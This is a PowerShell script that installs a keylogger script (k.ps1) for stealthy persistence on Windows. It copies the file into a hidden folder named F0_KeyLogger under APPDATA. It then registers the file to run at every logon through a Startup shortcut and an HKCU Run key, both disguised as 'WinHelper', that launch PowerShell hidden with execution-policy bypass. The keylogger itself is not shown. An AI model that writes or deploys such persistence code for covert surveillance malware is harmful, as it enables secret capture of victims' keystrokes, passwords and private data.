# Define the script path manually (replace this with your actual script path)
$scriptPath = "C:\Path\To\Your\Script\k.ps1"  # Modify this to the actual path where k.ps1 is located

# Ensure the directory exists
$targetDir = "$env:APPDATA\Local\F0_KeyLogger"
if (-not (Test-Path $targetDir)) {
    New-Item -Path $targetDir -ItemType Directory
}

# Set the target file path
$targetPath = Join-Path $targetDir "k.ps1"

# Check if the script path is valid and copy the script to the target directory
if (Test-Path $scriptPath) {
    # Copy the script to the target location
    Copy-Item -Path $scriptPath -Destination $targetPath -Force
    # Make the file hidden
    attrib +h $targetPath
} else {
    Write-Host "The script file does not exist at the provided path."
    exit
}

# Add script to Startup folder via shortcut
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = Join-Path $startupFolder "WinHelper.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-w hidden -NoP -Ep Bypass -File `"$targetPath`""
$shortcut.IconLocation = "shell32.dll, 17"
$shortcut.Save()

# Alternatively, add to Registry for persistence (if you prefer this over a shortcut)
$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regKeyName = "WinHelper"
$regKeyValue = "powershell -w hidden -NoP -Ep Bypass -File `"$targetPath`""

Set-ItemProperty -Path $regKeyPath -Name $regKeyName -Value $regKeyValue

Write-Host "Script setup complete. It will run on startup."
